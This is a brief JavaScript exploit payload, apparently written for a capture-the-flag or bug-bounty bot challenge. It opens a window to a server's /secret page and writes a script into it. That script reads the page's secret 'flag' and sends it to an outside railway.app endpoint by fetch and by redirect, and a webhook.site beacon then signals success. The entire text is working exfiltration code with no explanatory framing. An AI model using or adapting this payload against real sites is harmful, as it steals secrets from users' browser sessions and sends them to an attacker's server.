let value = window.open('http://20.235.243.131:8443/secret');
value.window.onload=()=>{
    value.document.write('<script>fetch("/secret").then(data => data.text()).then(flag => {fetch("https://fastapi-production-64ed.up.railway.app/bugbase?flag="+flag);window.location = "https://fastapi-production-64ed.up.railway.app/bugbase?flag="+flag;})</script>');
    window.location = "https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?test=BOT_TESTING_SUCCESS";
}
